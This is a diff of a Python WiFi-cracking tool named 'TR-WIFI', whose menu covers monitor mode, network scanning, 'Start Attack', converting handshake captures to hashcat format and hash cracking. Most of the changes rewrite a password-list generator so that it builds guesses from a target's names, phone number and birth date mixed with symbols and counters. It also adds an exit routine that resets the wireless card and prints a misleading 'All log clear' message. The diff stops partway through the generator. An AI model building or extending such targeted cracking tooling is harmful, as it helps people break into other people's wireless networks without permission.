@@ -1,5 +1,5 @@
 import os
-import sys
+import time
 import subprocess
 import pyfiglet
 import random, string
@@ -8,24 +8,36 @@ from colorama import Fore
 def banner():
     text = pyfiglet.figlet_format("TR-WIFI")
     print(f"{Fore.CYAN}{text}")
-    print(Fore.YELLOW + "Developed by - TRFAHIM" + Fore.RESET)
+    print(Fore.YELLOW + "Developed by - TR FAHIM" + Fore.RESET)
 
 def home_menu():
-    print(f"\n{Fore.LIGHTBLUE_EX}[1] {Fore.WHITE}Monitor Mode")
-    print(f"{Fore.LIGHTMAGENTA_EX}[2] {Fore.WHITE}Scan Available Wifi")
-    print(f"{Fore.LIGHTYELLOW_EX}[3] {Fore.WHITE}Start Attack")
-    print(f"{Fore.GREEN}[4] {Fore.WHITE}Convert Cap File")
-    print(f"{Fore.LIGHTBLUE_EX}[5] {Fore.WHITE}Password Genator")
-    print(f"{Fore.LIGHTMAGENTA_EX}[6] {Fore.WHITE}Hash Password Crack")
+    print(f"\n\n{Fore.LIGHTBLUE_EX}[1] {Fore.WHITE}Monitor Mode\n")
+    print(f"{Fore.LIGHTMAGENTA_EX}[2] {Fore.WHITE}Scan Available Wifi\n")
+    print(f"{Fore.LIGHTYELLOW_EX}[3] {Fore.WHITE}Start Attack\n")
+    print(f"{Fore.GREEN}[4] {Fore.WHITE}Convert Cap File\n")
+    print(f"{Fore.LIGHTBLUE_EX}[5] {Fore.WHITE}Password Genator\n")
+    print(f"{Fore.LIGHTMAGENTA_EX}[6] {Fore.WHITE}Hash Password Crack\n")
+    print(f"{Fore.BLUE}[7] {Fore.WHITE}Show Cracked Password\n")
     print(f"{Fore.RED}[0] {Fore.WHITE}Exit")
 
 def cl():
     os.system("clear" if os.name == "posix" else "cls")
 
 def back_home():
-    b_hm = input(f"\n{Fore.GREEN}[H] Back Home {Fore.RED}[E] Exit >> {Fore.WHITE}").upper()
+    b_hm = input(f"\n{Fore.GREEN}[H] {Fore.RESET}Back Home {Fore.RED}[E] {Fore.RESET}Exit >> {Fore.CYAN}").upper()
     if b_hm == "E":
-        sys.exit(0)
+        input(Fore.RED+"\nPress Enter to EXIT >> ")
+        print(Fore.BLUE+"\nClear all data. Wait Sometimes....")
+        time.sleep(2)  
+        os.system("ifconfig wlan0 down")
+        os.system("iwconfig wlan0 mode managed")
+        os.system("ifconfig wlan0 up")
+        print(Fore.GREEN+"\n[+] All log clear") 
+        time.sleep(2)
+        print(Fore.MAGENTA+"[+] Your are on Managed mode\n")
+        time.sleep(1)
+        print(Fore.GREEN+"[+] Exit Sucessful\n")
+        os._exit(0)
     else:
         main()
 
@@ -77,302 +89,327 @@ def convert_cap_to_22000(cap_file, output_file):
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
         if result.returncode == 0:
-            print(Fore.GREEN + f"[+] Conversion successful! Output file: {output_file}" + Fore.RESET)
+            print(Fore.GREEN + f"\n[+] Conversion successful! Output file: {output_file}" + Fore.RESET)
         else:
-            print(Fore.RED + f"[-] Conversion failed. Error:\n{result.stderr}" + Fore.RESET)
+            print(Fore.RED + f"\n[-] Conversion failed. Error:\n{result.stderr}" + Fore.RESET)
 
     except Exception as e:
-        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)
+        print(Fore.RED + f"\n[-] Error: {e}" + Fore.RESET)
 
-def pass_generator(first_nm,middle_nm,last_nm):
+
+def generate_password_list(first_name, middle_name, last_name,
+                           first_name_ca, 
+                           first_name_lo,
+                           first_name_ti,
+                           middle_name_ca,
+                           middle_name_lo,
+                           middle_name_ti,
+                           last_name_ca,
+                           last_name_lo,
+                           last_name_ti,
+                           phone_num,
+                           birth_day,
+                           birth_month,
+                           birth_year,
+                           ):
     
     passwords = []
+    symbol_at = ("@")
+    symbol_hash = ("#")
+    symbol_and = ("&")
     
-    first_1 = first_nm[:1]
-    last_1 = last_nm[:1]
-    first_2 = first_nm[:2]
-    last_2 = last_nm[:2]
-    
-    for zero in range(8,21):
+    passwords.append(f"{first_name}")
+    passwords.append(f"{first_name_ca}")
+    passwords.append(f"{first_name_lo}")
+    passwords.append(f"{first_name_ti}")
+    passwords.append(f"{first_name}{symbol_at}")
+    passwords.append(f"{first_name_ca}{symbol_at}")
+    passwords.append(f"{first_name_lo}{symbol_at}")
+    passwords.append(f"{first_name_ti}{symbol_at}")
+    passwords.append(f"{first_name}{symbol_hash}")
+    passwords.append(f"{first_name_ca}{symbol_hash}")
+    passwords.append(f"{first_name_lo}{symbol_hash}")
+    passwords.append(f"{first_name_ti}{symbol_hash}")
+    passwords.append(f"{first_name}{symbol_and}")
+    passwords.append(f"{first_name_ca}{symbol_and}")
+    passwords.append(f"{first_name_lo}{symbol_and}")
+    passwords.append(f"{first_name_ti}{symbol_and}")
+    if middle_name:
+        passwords.append(f"{middle_name}")
+        passwords.append(f"{middle_name_ca}")
+        passwords.append(f"{middle_name_lo}")
+        passwords.append(f"{middle_name_ti}")
+        
+    for zero in range (8, 21):
         passwords.append("0"*zero)
+        
+    passwords.append(f"{last_name}")
+    passwords.append(f"{last_name_ca}")
+    passwords.append(f"{last_name_lo}")
+    passwords.append(f"{last_name_ti}")
+    passwords.append(f"{last_name}{symbol_at}")
+    passwords.append(f"{last_name_ca}{symbol_at}")
+    passwords.append(f"{last_name_lo}{symbol_at}")
+    passwords.append(f"{last_name_ti}{symbol_at}")
+    passwords.append(f"{last_name}{symbol_hash}")
+    passwords.append(f"{last_name_ca}{symbol_hash}")
+    passwords.append(f"{last_name_lo}{symbol_hash}")
+    passwords.append(f"{last_name_ti}{symbol_hash}")
+    passwords.append(f"{last_name}{symbol_and}")
+    passwords.append(f"{last_name_ca}{symbol_and}")
+    passwords.append(f"{last_name_lo}{symbol_and}")
+    passwords.append(f"{last_name_ti}{symbol_and}")
     
-    for num in range(1000001):
-        digit = int(num)
-        
-        ## Special Case
-        passwords.append("@"*8)
-        passwords.append("@"*9)
-        passwords.append("@"*10)
-        passwords.append("@"*11)
-        passwords.append("."*8)
-        passwords.append("."*9)
-        passwords.append("."*10)
-        passwords.append("."*11)
-        passwords.append("!@#$%^&*")
-        passwords.append("#"*8)
-        passwords.append("#"*9)
-        passwords.append("#"*10)
-        passwords.append("#"*11)
-        passwords.append("*"*8)
-        passwords.append("*"*9)
-        passwords.append("*"*10)
-        passwords.append("*"*11)
-        passwords.append(f"Password{digit}")
-        passwords.append("Password")
-        passwords.append("PASSWORD")
-        passwords.append("password")
-        passwords.append(f"password{digit}")
-        passwords.append(f"PASSWORD{digit}")
     
-        for sm_num in range(8, 20):
-            passwords.append("1"*sm_num)
-            passwords.append("2"*sm_num)
-            passwords.append("3"*sm_num)
-            passwords.append("4"*sm_num)
-            passwords.append("5"*sm_num)
-            passwords.append("6"*sm_num)
-            passwords.append("7"*sm_num)
-            passwords.append("8"*sm_num)
-            passwords.append("9"*sm_num)
+    full_name_1 = f"{first_name}{middle_name}{last_name}" if middle_name else f"{first_name}{last_name}"
+    passwords.append(f"{full_name_1}")
+    passwords.append(f"{full_name_1.upper()}")
+    passwords.append(f"{full_name_1.lower()}")
+    passwords.append(f"{full_name_1.title()}")
+    
+    full_name_2 = f"{first_name} {middle_name} {last_name}" if middle_name else f"{first_name} {last_name}"
+    passwords.append(f"{full_name_2.upper()}")
+    passwords.append(f"{full_name_2.lower()}")
+    passwords.append(f"{full_name_2.title()}")
+    
+    ## NEW UPDATE 2.0
+    if phone_num:
+        passwords.append(f"{phone_num}")
+        passwords.append(f"{first_name}{symbol_at}{phone_num}")
+        passwords.append(f"{first_name}{symbol_hash}{phone_num}")
+        passwords.append(f"{first_name}{symbol_and}{phone_num}")
+        passwords.append(f"{last_name}{symbol_at}{phone_num}")
+        passwords.append(f"{last_name}{symbol_hash}{phone_num}")
+        passwords.append(f"{last_name}{symbol_and}{phone_num}")
         
-        ## New Method
-        passwords.append(f"{first_1}{last_1}{digit}")
-        passwords.append(f"{first_1.upper()}{last_1.upper()}{digit}")
-        passwords.append(f"{first_1.lower()}{last_1.lower()}{digit}")
-        passwords.append(f"{first_1}{last_1}@{digit}")
-        passwords.append(f"{first_1}{last_1}#{digit}")
-        passwords.append(f"{digit}{first_1}{last_1}")
+    if birth_day:
+        all_birth = (birth_day+birth_month+birth_year)
+        passwords.append(f"{birth_day}")
+        passwords.append(f"{birth_month}")
+        passwords.append(f"{birth_year}")
+        passwords.append(f"{all_birth}")  
+        passwords.append(f"{birth_day}{birth_month}")
+        passwords.append(f"{birth_month}{birth_year}")
+        passwords.append(f"{birth_day}{birth_year}")
+        passwords.append(f"{first_name}{phone_num}")
+        passwords.append(f"{last_name}{phone_num}")
+        passwords.append(f"{first_name}{birth_day}")
+        passwords.append(f"{first_name}{birth_month}")
+        passwords.append(f"{first_name}{birth_year}")
+        passwords.append(f"{last_name}{birth_day}")
+        passwords.append(f"{last_name}{birth_month}")
+        passwords.append(f"{last_name}{birth_year}")
         
-        passwords.append(f"{digit}{first_nm[:2].title()}")
-        passwords.append(f"{digit}@{first_nm[:2].title()}")
-        passwords.append(f"{digit}#{first_nm[:2].title()}")
-        passwords.append(f"{digit}{first_nm[:2].upper()}")
-        passwords.append(f"{digit}{first_nm[:2].lower()}")
-        passwords.append(f"{digit}@{first_nm[:2].upper()}")
-        passwords.append(f"{digit}@{first_nm[:2].lower()}")
-        passwords.append(f"{first_nm[:2].title()}{digit}")
-        passwords.append(f"{first_nm[:2].title()}@{digit}")
-        passwords.append(f"{first_nm[:2].title()}#{digit}")
-        passwords.append(f"{first_nm[:2].upper()}{digit}")
-        passwords.append(f"{first_nm[:2].lower()}{digit}")
-        passwords.append(f"{first_nm[:2].upper()}@{digit}")
-        passwords.append(f"{first_nm[:2].lower()}#{digit}")
-        
-        passwords.append(f"{digit}{first_nm[:3].title()}")
-        passwords.append(f"{digit}@{first_nm[:3].title()}")
-        passwords.append(f"{digit}#{first_nm[:3].title()}")
-        passwords.append(f"{digit}{first_nm[:3].upper()}")
-        passwords.append(f"{digit}{first_nm[:3].lower()}")
-        passwords.append(f"{digit}@{first_nm[:3].upper()}")
-        passwords.append(f"{digit}@{first_nm[:3].lower()}")  
-        passwords.append(f"{first_nm[:3].title()}{digit}")
-        passwords.append(f"{first_nm[:3].title()}@{digit}")
-        passwords.append(f"{first_nm[:3].title()}#{digit}")
-        passwords.append(f"{first_nm[:3].upper()}{digit}")
-        passwords.append(f"{first_nm[:3].lower()}{digit}")
-        passwords.append(f"{first_nm[:3].upper()}@{digit}")
-        passwords.append(f"{first_nm[:3].lower()}#{digit}")
-        
-        passwords.append(f"{first_nm[-3:].title()}{digit}")
-        passwords.append(f"{first_nm[-3:].title()}@{digit}")
-        passwords.append(f"{first_nm[-3:].title()}#{digit}")
-        passwords.append(f"{first_nm[-3:].upper()}{digit}")
-        passwords.append(f"{first_nm[-3:].lower()}{digit}")
-        passwords.append(f"{first_nm[-3:].upper()}@{digit}")
-        passwords.append(f"{first_nm[-3:].lower()}#{digit}")
-        passwords.append(f"{digit}{first_nm[-3:].title()}")
-        passwords.append(f"{digit}@{first_nm[-3:].title()}")
-        passwords.append(f"{digit}#{first_nm[-3:].title()}")
-        passwords.append(f"{digit}{first_nm[-3:].upper()}")
-        passwords.append(f"{digit}{first_nm[-3:].lower()}")
-        passwords.append(f"{digit}@{first_nm[-3:].upper()}")
-        passwords.append(f"{digit}@{first_nm[-3:].lower()}")  
-        
-        passwords.append(f"{first_2.title()}{digit}")
-        passwords.append(f"{first_2.upper()}{digit}")
-        passwords.append(f"{first_2.lower()}{digit}")
-        passwords.append(f"{first_2}@{digit}")
-        passwords.append(f"{first_2}#{digit}")
-        passwords.append(f"{first_2}{last_2}")
-        ## First Name
-        passwords.append(f"{first_nm}{digit}")
-        passwords.append(f"{first_nm.upper()}{digit}")
-        passwords.append(f"{first_nm.lower()}{digit}")
-        passwords.append(f"{digit}{first_nm}")
-        passwords.append(f"{digit}{first_nm.upper()}")
-        passwords.append(f"{digit}{first_nm.lower()}")
-        passwords.append(f"{digit}@{first_nm}")
-        passwords.append(f"{digit}#{first_nm}")
-        passwords.append(f"{digit}&{first_nm}")
-        passwords.append(f"{digit}@{first_nm.upper()}")
-        passwords.append(f"{digit}#{first_nm.upper()}")
-        passwords.append(f"{digit}&{first_nm.upper()}")
-        passwords.append(f"{digit}@{first_nm.lower()}")
-        passwords.append(f"{digit}#{first_nm.lower()}")
-        passwords.append(f"{digit}&{first_nm.lower()}")
-        passwords.append(f"{first_nm}@{digit}")
-        passwords.append(f"{first_nm}#{digit}")
-        passwords.append(f"{first_nm}&{digit}")
-        passwords.append(f"{first_nm.upper()}@{digit}")
-        passwords.append(f"{first_nm.upper()}#{digit}")
-        passwords.append(f"{first_nm.upper()}&{digit}")
-        passwords.append(f"{first_nm.lower()}@{digit}")
-        passwords.append(f"{first_nm.lower()}#{digit}")
-        passwords.append(f"{first_nm.lower()}&{digit}")
-        passwords.append(f"{first_nm}_{digit}")
-        passwords.append(f"{first_nm.upper()}_{digit}")
-        passwords.append(f"{first_nm.lower()}_{digit}")
-        passwords.append(f"{digit}_{first_nm}")
-        passwords.append(f"{digit}_{first_nm.upper()}")
-        passwords.append(f"{digit}_{first_nm.lower()}")
-            
-        if last_nm:
-            ## New 
-            passwords.append(f"{digit}{last_nm[:2].title()}")
-            passwords.append(f"{digit}@{last_nm[:2].title()}")
-            passwords.append(f"{digit}#{last_nm[:2].title()}")
-            passwords.append(f"{digit}{last_nm[:2].upper()}")
-            passwords.append(f"{digit}{last_nm[:2].lower()}")
-            passwords.append(f"{digit}@{last_nm[:2].upper()}")
-            passwords.append(f"{digit}@{last_nm[:2].lower()}")
-            passwords.append(f"{last_nm[:2].title()}{digit}")
-            passwords.append(f"{last_nm[:2].title()}@{digit}")
-            passwords.append(f"{last_nm[:2].title()}#{digit}")
-            passwords.append(f"{last_nm[:2].upper()}{digit}")
-            passwords.append(f"{last_nm[:2].lower()}{digit}")
-            passwords.append(f"{last_nm[:2].upper()}@{digit}")
-            passwords.append(f"{last_nm[:2].lower()}#{digit}")
-            
-            passwords.append(f"{digit}{last_nm[:3].title()}")
-            passwords.append(f"{digit}@{last_nm[:3].title()}")
-            passwords.append(f"{digit}#{last_nm[:3].title()}")
-            passwords.append(f"{digit}{last_nm[:3].upper()}")
-            passwords.append(f"{digit}{last_nm[:3].lower()}")
-            passwords.append(f"{digit}@{last_nm[:3].upper()}")
-            passwords.append(f"{digit}@{last_nm[:3].lower()}")
-            
-            passwords.append(f"{last_nm[:3].title()}{digit}")
-            passwords.append(f"{last_nm[:3].title()}@{digit}")
-            passwords.append(f"{last_nm[:3].title()}#{digit}")
-            passwords.append(f"{last_nm[:3].upper()}{digit}")
-            passwords.append(f"{last_nm[:3].lower()}{digit}")
-            passwords.append(f"{last_nm[:3].upper()}@{digit}")
-            passwords.append(f"{last_nm[:3].lower()}#{digit}")
-            
-            passwords.append(f"{last_nm[-3:].title()}{digit}")
-            passwords.append(f"{last_nm[-3:].title()}@{digit}")
-            passwords.append(f"{last_nm[-3:].title()}#{digit}")
-            passwords.append(f"{last_nm[-3:].upper()}{digit}")
-            passwords.append(f"{last_nm[-3:].lower()}{digit}")
-            passwords.append(f"{last_nm[-3:].upper()}@{digit}")
-            passwords.append(f"{last_nm[-3:].lower()}#{digit}")
-            
-            passwords.append(f"{digit}{last_nm[-3:].title()}")
-            passwords.append(f"{digit}@{last_nm[-3:].title()}")
-            passwords.append(f"{digit}#{last_nm[-3:].title()}")
-            passwords.append(f"{digit}{last_nm[-3:].upper()}")
-            passwords.append(f"{digit}{last_nm[-3:].lower()}")
-            passwords.append(f"{digit}@{last_nm[-3:].upper()}")
-            passwords.append(f"{digit}@{last_nm[-3:].lower()}") 
- 
-            ## Last Name 
-            passwords.append(f"{last_nm}{digit}")
-            passwords.append(f"{last_nm.upper()}{digit}")
-            passwords.append(f"{last_nm.lower()}{digit}")
-            passwords.append(f"{digit}{last_nm}")
-            passwords.append(f"{digit}{last_nm.upper()}")
-            passwords.append(f"{digit}{last_nm.lower()}")
-            passwords.append(f"{digit}@{last_nm}")
-            passwords.append(f"{digit}#{last_nm}")
-            passwords.append(f"{digit}&{last_nm}")
-            passwords.append(f"{digit}@{last_nm.upper()}")
-            passwords.append(f"{digit}#{last_nm.upper()}")
-            passwords.append(f"{digit}&{last_nm.upper()}")
-            passwords.append(f"{digit}@{last_nm.lower()}")
-            passwords.append(f"{digit}#{last_nm.lower()}")
-            passwords.append(f"{digit}&{last_nm.lower()}")
-            passwords.append(f"{last_nm}@{digit}")
-            passwords.append(f"{last_nm}#{digit}")
-            passwords.append(f"{last_nm}&{digit}")
-            passwords.append(f"{last_nm.upper()}@{digit}")
-            passwords.append(f"{last_nm.upper()}#{digit}")
-            passwords.append(f"{last_nm.upper()}&{digit}")
-            passwords.append(f"{last_nm.lower()}@{digit}")
-            passwords.append(f"{last_nm.lower()}#{digit}")
-            passwords.append(f"{last_nm.lower()}&{digit}")
-            
-            passwords.append(f"{first_nm}{last_nm}")
-            passwords.append(f"{first_nm}{last_nm}{digit}")
-            passwords.append(f"{digit}{last_nm}{first_nm}")
-            passwords.append(f"{first_nm.upper()}{last_nm.upper()}")
-            passwords.append(f"{first_nm.lower()}{last_nm.lower()}")
-            passwords.append(f"{first_nm.upper()}{last_nm.lower()}")
-            passwords.append(f"{first_nm.lower()}{last_nm.upper()}")
-            passwords.append(f"{first_nm.upper()}{last_nm.lower()}{digit}")
-            passwords.append(f"{first_nm.lower()}{last_nm.upper()}{digit}")
-            passwords.append(f"{first_nm.upper()}{digit}{last_nm.lower()}")
-            passwords.append(f"{first_nm.lower()}{digit}{last_nm.upper()}")
-            
-            passwords.append(f"{first_nm}@{last_nm}")
-            passwords.append(f"{first_nm}{last_nm}@{digit}")
-            passwords.append(f"{first_nm.upper()}@{last_nm.upper()}")
-            passwords.append(f"{first_nm.lower()}@{last_nm.lower()}")
-            passwords.append(f"{first_nm}#{last_nm}")
-            passwords.append(f"{first_nm.upper()}#{last_nm.upper()}")
-            passwords.append(f"{first_nm.lower()}#{last_nm.lower()}")
-            passwords.append(f"{first_nm}&{last_nm}")
-            passwords.append(f"{first_nm}{last_nm}&{digit}")
-            passwords.append(f"{first_nm.upper()}&{last_nm.upper()}")
-            passwords.append(f"{first_nm.lower()}&{last_nm.lower()}")
-            
-            passwords.append(f"{last_nm}{first_nm}")
-            passwords.append(f"{last_nm.upper()}{first_nm.upper()}")
-            passwords.append(f"{last_nm.lower()}{first_nm.lower()}")
-            passwords.append(f"{first_nm}_{last_nm}")
-            passwords.append(f"{first_nm.upper()}_{last_nm.upper()}")
-            passwords.append(f"{first_nm.lower()}_{last_nm.lower()}")
-            passwords.append(f"{first_nm}_{last_nm}{digit}")
-            passwords.append(f"{first_nm.upper()}_{last_nm.upper()}{digit}")
-            passwords.append(f"{first_nm.lower()}_{last_nm.lower()}{digit}")
-        
-        if middle_nm:
-            if len(middle_nm) == 3:
-                passwords.append(f"{middle_nm}{digit:05d}") 
-                passwords.append(f"{middle_nm.upper()}{digit:05d}") 
-                passwords.append(f"{middle_nm.lower()}{digit:05d}") 
-            elif len(middle_nm) == 4:
-                passwords.append(f"{middle_nm}{digit:04d}")
-                passwords.append(f"{middle_nm.upper()}{digit:04d}")
-                passwords.append(f"{middle_nm.lower()}{digit:04d}")
-            elif len(middle_nm) == 5:
-                passwords.append(f"{middle_nm}{digit:03d}")
-                passwords.append(f"{middle_nm.upper()}{digit:03d}")
-                passwords.append(f"{middle_nm.lower()}{digit:03d}")
-            elif len(middle_nm) == 6:
-                passwords.append(f"{middle_nm}{digit:02d}")
-                passwords.append(f"{middle_nm.upper()}{digit:02d}")
-                passwords.append(f"{middle_nm.lower()}{digit:02d}")
-            else:
-                passwords.append(f"{middle_nm}{digit}")
-                passwords.append(f"{middle_nm.upper()}{digit}")  
-                passwords.append(f"{middle_nm.lower()}{digit}")    
-         
-        passwords.append(digit)                
-        passwords.append(f"{digit:08d}")    
-        passwords.append(f"{digit:09d}")
-        passwords.append(f"{digit:010d}") 
-        passwords.append(f"{digit:05d}{digit:06d}")
-        passwords.append(f"{digit:06d}{digit:06d}") 
-        passwords.append(f"{digit:06d}{digit:07d}")    
-         
-    return passwords
-            
-def save_file(passwords, file_name="wifi_passlist.txt"):
-    with open(file_name, "w") as file:
-        for password in passwords:
-            file.write(f"{password}\n")
+        passwords.append(f"{first_name}{symbol_at}{birth_day}")
+        passwords.append(f"{first_name}{symbol_at}{birth_month}")
+        passwords.append(f"{first_name}{symbol_at}{birth_year}")
+        passwords.append(f"{first_name}{symbol_hash}{birth_day}")
+        passwords.append(f"{first_name}{symbol_hash}{birth_month}")
+        passwords.append(f"{first_name}{symbol_hash}{birth_year}")
+        passwords.append(f"{first_name}{symbol_and}{birth_day}")
+        passwords.append(f"{first_name}{symbol_and}{birth_month}")
+        passwords.append(f"{first_name}{symbol_and}{birth_year}")
+        passwords.append(f"{last_name}{symbol_at}{birth_day}")
+        passwords.append(f"{last_name}{symbol_at}{birth_month}")
+        passwords.append(f"{last_name}{symbol_at}{birth_year}")
+        passwords.append(f"{last_name}{symbol_hash}{birth_day}")
+        passwords.append(f"{last_name}{symbol_hash}{birth_month}")
+        passwords.append(f"{last_name}{symbol_hash}{birth_year}")
+        passwords.append(f"{last_name}{symbol_and}{birth_day}")
+        passwords.append(f"{last_name}{symbol_and}{birth_month}")
+        passwords.append(f"{last_name}{symbol_and}{birth_year}")
 
-    print(f"\nPasslist save as {file_name}\n")
+        passwords.append(f"{first_name}{all_birth}")
+        passwords.append(f"{first_name}{symbol_at}{all_birth}")
+        passwords.append(f"{first_name}{symbol_hash}{all_birth}")
+        passwords.append(f"{first_name}{symbol_and}{all_birth}")
+        passwords.append(f"{last_name}{all_birth}")
+        passwords.append(f"{last_name}{symbol_at}{all_birth}")
+        passwords.append(f"{last_name}{symbol_hash}{all_birth}")
+        passwords.append(f"{last_name}{symbol_and}{all_birth}")
+    
+    if middle_name and birth_day:
+        passwords.append(f"{middle_name}{phone_num}")
+        passwords.append(f"{middle_name}{birth_day}")
+        passwords.append(f"{middle_name}{birth_month}")
+        passwords.append(f"{middle_name}{birth_year}")
+        passwords.append(f"{middle_name}{symbol_at}{phone_num}")
+        passwords.append(f"{middle_name}{symbol_hash}{phone_num}")
+        passwords.append(f"{middle_name}{symbol_and}{phone_num}")
+        passwords.append(f"{middle_name}{symbol_at}{birth_day}")
+        passwords.append(f"{middle_name}{symbol_at}{birth_month}")
+        passwords.append(f"{middle_name}{symbol_at}{birth_year}")
+        passwords.append(f"{middle_name}{symbol_hash}{birth_day}")
+        passwords.append(f"{middle_name}{symbol_hash}{birth_month}")
+        passwords.append(f"{middle_name}{symbol_hash}{birth_year}")
+        passwords.append(f"{middle_name}{symbol_and}{birth_day}")
+        passwords.append(f"{middle_name}{symbol_and}{birth_month}")
+        passwords.append(f"{middle_name}{symbol_and}{birth_year}")
+        passwords.append(f"{middle_name}{all_birth}")
+        passwords.append(f"{middle_name}{symbol_at}{all_birth}")
+        passwords.append(f"{middle_name}{symbol_hash}{all_birth}")
+        passwords.append(f"{middle_name}{symbol_and}{all_birth}")
+
+    for num in range(100001): 
+        digit = str(num)  
+        
+        passwords.append(f"{first_name}{digit}")
+        passwords.append(f"{first_name_ca}{digit}")
+        passwords.append(f"{first_name_lo}{digit}")
+        passwords.append(f"{first_name_ti}{digit}")
+        
+        #Symbol_firstname
+        #symbol_hash = ("@") FIRSTNAME 
+        passwords.append(f"{first_name}{symbol_at}{digit}")
+        passwords.append(f"{first_name_ca}{symbol_at}{digit}")
+        passwords.append(f"{first_name_lo}{symbol_at}{digit}")
+        passwords.append(f"{first_name_ti}{symbol_at}{digit}")
+        
+        #symbol_hash = ("#") FIRSTNAME
+        passwords.append(f"{first_name_ca}{symbol_hash}{digit}")
+        passwords.append(f"{first_name_lo}{symbol_hash}{digit}")
+        passwords.append(f"{first_name_ti}{symbol_hash}{digit}")
+        passwords.append(f"{first_name}{symbol_hash}{digit}")
+        
+        #symbol_and = ("&") FIRSTNAME
+        passwords.append(f"{first_name_ca}{symbol_and}{digit}")
+        passwords.append(f"{first_name}{symbol_and}{digit}")
+        passwords.append(f"{first_name_lo}{symbol_and}{digit}")
+        passwords.append(f"{first_name_ti}{symbol_and}{digit}")
+        
+        if middle_name: 
+            passwords.append(f"{middle_name}{digit}")
+            passwords.append(f"{middle_name_ca}{digit}")
+            passwords.append(f"{middle_name_lo}{digit}")
+            passwords.append(f"{middle_name_ti}{digit}")
+            
+            #Symbol_middlename
+            # symbol_at = ("@") Middle Name
+            passwords.append(f"{middle_name_ca}{symbol_at}{digit}")
+            passwords.append(f"{middle_name_lo}{symbol_at}{digit}")
+            passwords.append(f"{middle_name_ti}{symbol_at}{digit}")
+            passwords.append(f"{middle_name}{symbol_at}{digit}")
+            
+            # symbol_hash = ("#")
+            passwords.append(f"{middle_name_ca}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name_lo}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name_ti}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name}{symbol_hash}{digit}")
+            
+            # symbol_and = ("&")
+            passwords.append(f"{middle_name_ca}{symbol_and}{digit}")
+            passwords.append(f"{middle_name_lo}{symbol_and}{digit}")
+            passwords.append(f"{middle_name_ti}{symbol_and}{digit}")
+            passwords.append(f"{middle_name}{symbol_and}{digit}")
+            
+            # Symbol FirstName+MiddleName
+            passwords.append(f"{first_name}{middle_name}{symbol_at}{digit}")
+            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_at}{digit}")
+            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_at}{digit}")
+            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_at}{digit}")
+            passwords.append(f"{first_name}{middle_name}{symbol_hash}{digit}")
+            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_hash}{digit}")
+            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_hash}{digit}")
+            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_hash}{digit}")
+            passwords.append(f"{first_name}{middle_name}{symbol_and}{digit}")
+            passwords.append(f"{first_name_ca}{middle_name_ca}{symbol_and}{digit}")
+            passwords.append(f"{first_name_lo}{middle_name_lo}{symbol_and}{digit}")
+            passwords.append(f"{first_name_ti}{middle_name_ti}{symbol_and}{digit}")
+            
+            #Special Symbol MiddleName+LastName
+            passwords.append(f"{middle_name}{last_name}{symbol_at}{digit}")
+            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_at}{digit}")
+            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_at}{digit}")
+            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_at}{digit}")
+            passwords.append(f"{middle_name}{last_name}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_hash}{digit}")
+            passwords.append(f"{middle_name}{last_name}{symbol_and}{digit}")
+            passwords.append(f"{middle_name_ca}{last_name_ca}{symbol_and}{digit}")
+            passwords.append(f"{middle_name_lo}{last_name_lo}{symbol_and}{digit}")
+            passwords.append(f"{middle_name_ti}{last_name_ti}{symbol_and}{digit}")
+        
+        #Symbol_lastname
+        # symbol_at = ("@")
+        passwords.append(f"{last_name_ca}{symbol_at}{digit}")
+        passwords.append(f"{last_name_lo}{symbol_at}{digit}")
+        passwords.append(f"{last_name_ti}{symbol_at}{digit}")
+        passwords.append(f"{last_name}{symbol_at}{digit}")
+        
+        # symbol_hash = ("#")
+        passwords.append(f"{last_name_ca}{symbol_hash}{digit}")
+        passwords.append(f"{last_name_lo}{symbol_hash}{digit}")
+        passwords.append(f"{last_name_ti}{symbol_hash}{digit}")
+        passwords.append(f"{last_name}{symbol_hash}{digit}")
+        
+        # symbol_and = ("&")
+        passwords.append(f"{last_name_ca}{symbol_and}{digit}")
+        passwords.append(f"{last_name_lo}{symbol_and}{digit}")
+        passwords.append(f"{last_name_ti}{symbol_and}{digit}")
+        passwords.append(f"{last_name}{symbol_and}{digit}")
+        
+        passwords.append(f"{last_name}{digit}")
+        passwords.append(f"{last_name_ca}{digit}")
+        passwords.append(f"{last_name_lo}{digit}")
+        passwords.append(f"{last_name_ti}{digit}")
+        
+        full_name = f"{first_name}{middle_name}{last_name}" if middle_name else f"{first_name}{last_name}"
+        passwords.append(f"{full_name}{digit}")
+        passwords.append(f"{full_name.upper()}{digit}")
+        passwords.append(f"{full_name.lower()}{digit}")
+        passwords.append(f"{full_name.title()}{digit}")
+        
+        full_name_space = f"{first_name} {middle_name} {last_name}" if middle_name else f"{first_name} {last_name}"
+        passwords.append(f"{full_name_space}{digit}")
+        passwords.append(f"{full_name_space.upper()}{digit}")
+        passwords.append(f"{full_name_space.lower()}{digit}")
+        passwords.append(f"{full_name_space.title()}{digit}")
+        
+        full_name_cap = f"{first_name.capitalize()}{middle_name.capitalize()}{last_name.capitalize()}" if middle_name else f"{first_name.capitalize()}{last_name.capitalize()}"
+        passwords.append(f"{full_name_cap}{digit}")
+        
+        # Special Symbol FastName+LastName
+        passwords.append(f"{first_name}{last_name}{symbol_at}{digit}")
+        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_at}{digit}")
+        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_at}{digit}")
+        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_at}{digit}")
+        passwords.append(f"{first_name}{last_name}{symbol_hash}{digit}")
+        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_hash}{digit}")
+        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_hash}{digit}")
